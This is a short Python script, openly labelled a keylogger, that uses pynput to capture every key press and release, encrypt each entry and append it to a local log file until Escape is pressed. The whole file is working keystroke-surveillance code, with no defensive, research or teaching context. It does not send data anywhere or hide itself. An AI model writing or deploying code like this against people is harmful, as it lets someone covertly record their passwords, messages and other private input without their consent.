import os
import sys
import argparse
import logging
from pynput import keyboard
from utils import generate_key, save_key, encrypt_data

def on_press(key, log_file, key_obj):
    """
    Callback function to handle key press events.
    """
    try:
        data = f"Key pressed: {key.vk}"
    except AttributeError:
        data = f"Special key pressed: {key}"

    encrypted_data = encrypt_data(data, key_obj)
    with open(log_file, "ab") as file:
        file.write(encrypted_data + b'\n')

def on_release(key, log_file, key_obj):
    """
    Callback function to handle key release events.
    """
    try:
        key_code = key.vk
    except AttributeError:
        key_code = str(key)

    data = f"Key released: {key_code}"
    encrypted_data = encrypt_data(data, key_obj)
    with open(log_file, "ab") as file:
        file.write(encrypted_data + b'\n')

    # Stop listener if escape key is pressed
    if key == keyboard.Key.esc:
        return False

def start_keylogger(log_file):
    key = generate_key()
    save_key(key)

    with keyboard.Listener(
        on_press=lambda event: on_press(event, log_file, key),
        on_release=lambda event: on_release(event, log_file, key)
    ) as listener:
        try:
            listener.join()
        except Exception as e:
            logging.error(f"Error: {e}")

def main():
    parser = argparse.ArgumentParser(description="keylogger")
    parser.add_argument("--log-file", default="log.txt", help="Path to the log file")
    args = parser.parse_args()

    start_keylogger(args.log_file)

if __name__ == "__main__":
    main()
